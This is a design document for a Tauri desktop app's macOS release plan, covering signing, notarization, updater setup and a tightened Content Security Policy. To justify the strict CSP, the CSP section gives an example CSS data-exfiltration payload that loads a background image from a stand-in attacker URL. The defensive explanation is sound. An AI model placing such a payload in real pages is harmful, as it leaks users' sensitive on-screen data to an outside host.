# Distribution Roadmap

**Status:** Accepted — M8 code + tooling landed in main; v0.1.0 not yet cut. See [`public-distribution.md`](./public-distribution.md) for the as-built record (signing identity, key custody, break-glass procedures) and current rollout status.

## Context

M7 (packaging readiness) produces a working, locally-launchable unsigned `.app` bundle via `cargo tauri build`. The bundle lives at `target/release/bundle/macos/Tubbie.app` (11 MB, aarch64). A companion `.dmg` installer is produced alongside it.

Public distribution on macOS requires additional steps that are unavailable without an Apple Developer ID certificate:

- **Code signing:** macOS Gatekeeper quarantines unsigned apps downloaded from the internet. Without a Developer ID Application certificate, users who download the `.app` must right-click → Open and explicitly trust it — not acceptable for public distribution.
- **Notarization:** Since macOS 10.15 (Catalina), Apple's notarization service is required for any app distributed outside the Mac App Store. The `notarytool` step submits the signed bundle to Apple for automated scanning; Apple returns a notarization ticket that is stapled to the bundle.
- **Auto-update:** Tauri's updater plugin (`tauri-plugin-updater`) delivers silent in-app updates. It requires a signed updater endpoint — a JSON file hosted on GitHub Releases describing the latest version and download URL. This plugin is not installed for M7.

The repository is currently private. Public distribution also requires the flip-to-public checklist documented in [open-sourcing-checklist](./open-sourcing-checklist.md).

## Decision

Defer signing, notarization, and auto-update wiring to M8. M7 ships:

1. A locally buildable, unsigned `.app` sufficient for contributors and internal testing.
2. `tauri.conf.json` with `bundle.macOS.signingIdentity = null` and `bundle.macOS.providerShortName = null` as explicit placeholders — these are the only fields that need populating before a signed release is cut.
3. `bundle.createUpdaterArtifacts = false` — flipped to `true` when the updater plugin and endpoint are wired.

### Concrete M8 steps

1. **Acquire Developer ID Application certificate** via Apple Developer portal (requires paid Apple Developer Program membership, $99/year). Export as `.p12`; store in CI as an encrypted secret (`APPLE_CERTIFICATE` + `APPLE_CERTIFICATE_PASSWORD`).
2. **Set `bundle.macOS.signingIdentity`** to the certificate name, e.g. `"Developer ID Application: Bruno Belcastro (XXXXXXXXXX)"`.
3. **Set `bundle.macOS.providerShortName`** to the Team ID (10-character alphanumeric from Apple Developer portal) — required for notarytool.
4. **Add `release.yml` workflow** (separate from `ci.yml`) triggered on `v*` tags:
   - Matrix: `macos-14` (arm64) + `macos-13` (x86_64).
   - Steps: checkout → setup Rust → `npm ci` in `web/` → `cargo tauri build` → codesign → `xcrun notarytool submit` → staple → upload artifacts to GitHub Release.
   - Secrets needed: `APPLE_CERTIFICATE`, `APPLE_CERTIFICATE_PASSWORD`, `APPLE_TEAM_ID`, `APPLE_ID`, `APPLE_APP_SPECIFIC_PASSWORD`.
5. **Install `tauri-plugin-updater`** (`cargo add tauri-plugin-updater` in `src-tauri/`): register in `lib.rs`; set `bundle.createUpdaterArtifacts = true`; create a `latest.json` endpoint on GitHub Releases.
6. **Flip repo visibility** to public per `open-sourcing-checklist.md` after confirming no secrets were ever committed, `LICENSE` is present (MIT), and README screenshots are added.

## CSP Tightening Outcome

**Final CSP string:**

```
default-src 'self'; script-src 'self'; style-src 'self'; connect-src 'self' https://api.tfl.gov.uk; img-src 'self' data:; font-src 'self'
```

**Why `'unsafe-inline'` was removed from both `script-src` and `style-src`:**

- Svelte 5 compiles component styles into external `.css` files (loaded via `<link>` tags), not inline `<style>` elements. No `'unsafe-inline'` is needed for `style-src`.
- The SvelteKit `adapter-static` build emits one inline `<script>` bootstrap block in `index.html`. Tauri v2's build pipeline (`tauri-codegen`) automatically computes the SHA-256 hash of every inline `<script>` element at compile time and injects those hashes into the `script-src` directive at runtime. This means the CSP enforces script integrity without `'unsafe-inline'`.
- The SvelteKit app.html template originally wrapped the body in `<div style="display: contents">`, which is a style *attribute* (not a `<style>` element). Tauri does not automatically handle style attributes; they require `'unsafe-inline'`. This wrapper was removed (the div is now an unstyled block element), allowing `style-src 'self'` without `'unsafe-inline'`.

**M8 CSP target:** No changes anticipated. The current CSP is already at the tightest viable level for this app. If Tauri IPC or a future plugin injects additional inline content, the hash-injection mechanism handles it automatically.

**What `'unsafe-inline'` would require and why it was avoided:**

`style-src 'unsafe-inline'` allows any inline `style=""` attribute or `<style>` block — this defeats the XSS-mitigation value of `style-src` (attackers who inject HTML can exfiltrate data via CSS `background-image: url(https://attacker/data)` on elements with sensitive text). The tighter CSP ensures styles only load from bundled `.css` files served from the app origin.

## Consequences

- Users who clone and build from source receive an unsigned `.app`. On macOS 13+, Gatekeeper will quarantine it with a "damaged or malicious" warning unless the user explicitly right-clicks → Open or runs `xattr -dr com.apple.quarantine Tubbie.app`. This is documented in the README under **Install**.
- No auto-update for contributors or early testers — they must rebuild manually.
- CI remains fast (no macOS build job, no signing secrets needed) until M8 lands.
- The `release.yml` workflow in M8 will be a net-new file — no changes to `ci.yml` required.
